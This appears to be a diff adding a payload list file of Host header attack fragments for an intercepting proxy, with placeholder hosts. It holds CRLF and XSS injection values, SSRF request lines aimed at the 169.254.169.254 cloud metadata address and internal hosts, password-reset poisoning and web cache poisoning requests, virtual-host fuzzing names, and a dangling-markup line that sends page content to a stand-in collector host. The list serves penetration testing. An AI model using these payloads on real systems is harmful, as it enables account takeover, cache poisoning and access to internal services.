@@ -1,0 +1,107 @@
+# Host Header Attack Payloads
+# Header and request-line fragments for a proxy. Replace example.test hosts with systems you control.
+
+# Direct Host replacement
+Host: oast.example.test
+Host: oast.example.test:80
+Host: oast.example.test:443
+Host: app.example.test.oast.example.test
+Host: oast.example.test/app.example.test
+Host: oast.example.test#app.example.test
+Host: oast.example.test?app.example.test
+Host: app.example.test@oast.example.test
+Host: app.example.test:@oast.example.test
+Host: app.example.test:80@oast.example.test
+Host: oast.example.test%00.app.example.test
+Host: oast.example.test%0d%0aX-Injected: host-marker
+Host: app.example.test:oast.example.test
+Host: app.example.test:80:80
+Host: [::1]
+Host: 169.254.169.254
+Host: internal.example.test
+Host: admin.example.test
+Host: staging.example.test
+
+# Port-based injection (value reflected into a link: https://app.example.test:<injected>/)
+Host: app.example.test:80"><a href="//oast.example.test">host-port-marker</a>
+Host: app.example.test:'"><script>document.title='host-xss-marker'</script>
+Host: app.example.test:80/../../
+
+# Override headers (send alongside the real Host header)
+X-Forwarded-Host: oast.example.test
+X-Forwarded-Server: oast.example.test
+X-Forwarded-Proto: https
+X-Forwarded-Port: 1337
+X-Forwarded-Scheme: nothttps
+X-Host: oast.example.test
+X-HTTP-Host-Override: oast.example.test
+X-Original-Host: oast.example.test
+X-Rewrite-Url: /admin
+Forwarded: host=oast.example.test
+Forwarded: for=127.0.0.1;host=oast.example.test;proto=https
+Forwarded: by=127.0.0.1;host=oast.example.test
+True-Client-IP: 127.0.0.1
+X-Cluster-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+Via: 1.1 oast.example.test
+Referer: https://oast.example.test/
+
+# Duplicate Host headers (two Host lines in a proxy; observe which one the application and the front end each use)
+GET / HTTP/1.1\r\nHost: app.example.test\r\nHost: oast.example.test\r\n\r\n
+GET / HTTP/1.1\r\nHost: oast.example.test\r\nHost: app.example.test\r\n\r\n
+
+# Indented or folded Host line (obsolete line folding some servers still tolerate)
+GET / HTTP/1.1\r\nHost: app.example.test\r\n Host: oast.example.test\r\n\r\n
+
+# Absolute-form request lines (the request line and Host disagree)
+GET https://app.example.test/ HTTP/1.1\r\nHost: oast.example.test\r\n\r\n
+GET https://oast.example.test/ HTTP/1.1\r\nHost: app.example.test\r\n\r\n
+GET http://oast.example.test/ HTTP/1.1\r\nHost: app.example.test\r\n\r\n
+GET @oast.example.test/ HTTP/1.1\r\nHost: app.example.test\r\n\r\n
+GET //oast.example.test/ HTTP/1.1\r\nHost: app.example.test\r\n\r\n
+
+# Reverse-proxy routing / SSRF through the request line (the proxy may forward to the host in the path)
+GET http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\nHost: app.example.test\r\n\r\n
+GET http://127.0.0.1:8080/ HTTP/1.1\r\nHost: app.example.test\r\n\r\n
+GET http://internal.example.test/ HTTP/1.1\r\nHost: app.example.test\r\n\r\n
+
+# Connection-state tests (first request validates the host, a later request on the same connection changes it)
+# Request 1: GET / HTTP/1.1, Host: app.example.test, Connection: keep-alive
+# Request 2: GET /admin HTTP/1.1, Host: admin.example.test, Connection: keep-alive
+
+# Virtual-host fuzzing candidates (Host values to brute-force against the same IP; compare status, size and title)
+Host: administrator.example.test
+Host: intranet.example.test
+Host: stage.example.test
+Host: dev.example.test
+Host: test.example.test
+Host: qa.example.test
+Host: uat.example.test
+Host: beta.example.test
+Host: api.example.test
+Host: api-internal.example.test
+Host: backend.example.test
+Host: console.example.test
+Host: dashboard.example.test
+Host: jenkins.example.test
+Host: grafana.example.test
+Host: kibana.example.test
+Host: gitlab.example.test
+Host: vpn.example.test
+Host: mail.example.test
+Host: webmail.example.test
+Host: old.example.test
+Host: legacy.example.test
+Host: preprod.example.test
+
+# Password reset poisoning (trigger for your own test account, then inspect the emailed link)
+POST /password-reset HTTP/1.1\r\nHost: oast.example.test\r\n\r\nemail=tester@example.test
+POST /password-reset HTTP/1.1\r\nHost: app.example.test\r\nX-Forwarded-Host: oast.example.test\r\n\r\nemail=tester@example.test
+POST /password-reset HTTP/1.1\r\nHost: app.example.test\r\nX-Forwarded-Host: oast.example.test\r\nX-Forwarded-Proto: https\r\n\r\nemail=tester@example.test
+
+# Web cache poisoning through an unkeyed host override (use a cache buster such as ?cb=unique-token)
+GET /?cb=host-cache-marker HTTP/1.1\r\nHost: app.example.test\r\nX-Forwarded-Host: oast.example.test"><script>document.title='host-cache-xss-marker'</script>\r\n\r\n
+
+# Dangling-markup and import reflection (look for absolute URLs built from the host)
+Host: app.example.test:80'><img src=//oast.example.test/h?
+X-Forwarded-Host: oast.example.test/.js#
